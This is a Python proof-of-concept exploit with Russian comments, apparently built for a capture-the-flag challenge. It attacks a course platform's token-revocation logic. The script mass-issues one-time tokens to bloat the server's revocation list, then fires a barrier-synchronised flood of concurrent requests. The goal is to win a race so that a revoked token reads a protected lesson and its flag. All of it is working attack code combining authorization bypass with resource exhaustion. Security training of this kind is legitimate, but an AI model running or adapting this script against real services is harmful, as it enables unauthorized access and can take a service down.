#!/usr/bin/env python3
"""
PoC v2: hypothesis о goroutine-leak deadlock.

Изменения от v1:
  - Использует requests (полное чтение ответов) вместо raw sockets.
  - Перед флудом РАЗДУВАЕТ revoked.txt: каждое использование OneTime токена
    добавляет 1 entry. Идём от файла с N тысяч entries — scan ~ms+, контеншн
    с 50ms timeout достижим.
  - В race-фазе бросаем большой поток одновременных запросов (использующих
    OneTime токены) и проверяем, начинают ли запросы получать 200 на
    /lessons/access/<slug16> с уже-revoked B.
"""
from __future__ import annotations
import os, sys, time, secrets, string, threading
from concurrent.futures import ThreadPoolExecutor
import requests

BASE = os.environ.get("BASE", "http://127.0.0.1:8080").rstrip("/")
PRE_FILL = int(os.environ.get("PRE_FILL", "5000"))
N_FLOOD = int(os.environ.get("N_FLOOD", "300"))
M_PROBE = int(os.environ.get("M_PROBE", "30"))


def rand_user():
    u = "u" + "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(11))
    p = "Pw" + secrets.token_urlsafe(12)
    return u, p


def main():
    s = requests.Session()
    print(f"[i] target: {BASE}, PRE_FILL={PRE_FILL}, N_FLOOD={N_FLOOD}, M_PROBE={M_PROBE}")

    u, p = rand_user()
    s.post(f"{BASE}/api/auth/register", json={"username": u, "password": p}, timeout=10)
    user_tok = s.post(f"{BASE}/api/auth/login",
                      json={"username": u, "password": p}, timeout=10).json()["token"]
    print(f"[1] user registered: {u}")

    # Issue B
    B = s.post(f"{BASE}/api/courses/4/lessons/15/request-access",
               headers={"Authorization": f"Bearer {user_tok}"}, timeout=10).json()["token"]

    # Use B to get slug16
    r = requests.get(f"{BASE}/api/courses/4",
                     headers={"Authorization": f"Bearer {B}"}, timeout=10)
    slug16 = next(l["slug"] for l in r.json()["lessons"] if l["id"] == 16 and l.get("slug"))
    print(f"[2] B + slug16 acquired (B revoked after this)")

    # Confirm B revoked
    r = requests.get(f"{BASE}/api/courses/4/lessons/access/{slug16}",
                     headers={"Authorization": f"Bearer {B}"}, timeout=10)
    print(f"[3] /lessons/access pre-flood with revoked B: {r.status_code}")

    # === PRE-FILL: раздуть revoked.txt ===
    print(f"[4] pre-filling revoked.txt with ~{PRE_FILL} entries (this takes a while)...")
    t0 = time.time()
    sess_lock = threading.Lock()

    def burn_one_token(_):
        try:
            tok = s.post(f"{BASE}/api/courses/4/lessons/15/request-access",
                         headers={"Authorization": f"Bearer {user_tok}"}, timeout=10).json()["token"]
            requests.get(f"{BASE}/api/courses/4",
                         headers={"Authorization": f"Bearer {tok}"}, timeout=10)
        except Exception as e:
            return False
        return True

    with ThreadPoolExecutor(max_workers=20) as ex:
        list(ex.map(burn_one_token, range(PRE_FILL)))

    print(f"    pre-fill done in {time.time()-t0:.1f}s")

    # === FLOOD + PROBE ===
    print(f"[5] preparing {N_FLOOD} flood OneTime tokens + {M_PROBE} probes")
    flood_toks = []
    for _ in range(N_FLOOD):
        try:
            t = s.post(f"{BASE}/api/courses/4/lessons/15/request-access",
                       headers={"Authorization": f"Bearer {user_tok}"}, timeout=10).json()["token"]
            flood_toks.append(t)
        except Exception:
            break
    print(f"    flood tokens: {len(flood_toks)}")

    barrier = threading.Barrier(len(flood_toks) + M_PROBE)
    probe_results = []
    probe_lock = threading.Lock()

    def flood(tok):
        barrier.wait()
        try:
            requests.get(f"{BASE}/api/courses/4",
                         headers={"Authorization": f"Bearer {tok}"}, timeout=10)
        except Exception:
            pass

    def probe(_):
        barrier.wait()
        try:
            r = requests.get(f"{BASE}/api/courses/4/lessons/access/{slug16}",
                             headers={"Authorization": f"Bearer {B}"}, timeout=10)
            with probe_lock:
                probe_results.append((r.status_code, r.text[:200]))
        except Exception as e:
            with probe_lock:
                probe_results.append((-1, str(e)))

    print(f"[6] firing barrier...")
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=len(flood_toks) + M_PROBE + 10) as ex:
        for tok in flood_toks:
            ex.submit(flood, tok)
        for i in range(M_PROBE):
            ex.submit(probe, i)
    print(f"    race took {time.time()-t0:.2f}s")

    statuses = {}
    for s_code, body in probe_results:
        statuses[s_code] = statuses.get(s_code, 0) + 1
    print(f"[7] probe statuses: {statuses}")

    for s_code, body in probe_results:
        if s_code == 200:
            print(f"\n[+] HIT! {body[:300]}")
            return 0
        if "alfa{" in body:
            print(f"\n[+] FLAG IN BODY: {body}")
            return 0

    # Post-mortem: was revocation killed?
    r = requests.get(f"{BASE}/api/courses/4/lessons/access/{slug16}",
                     headers={"Authorization": f"Bearer {B}"}, timeout=10)
    print(f"[8] sequential post-flood probe: {r.status_code}")
    if r.status_code == 200:
        print(f"\n[+] revocation IS DEAD: {r.text[:300]}")
        return 0

    print("\n[-] no luck this round")
    return 1


if __name__ == "__main__":
    sys.exit(main())
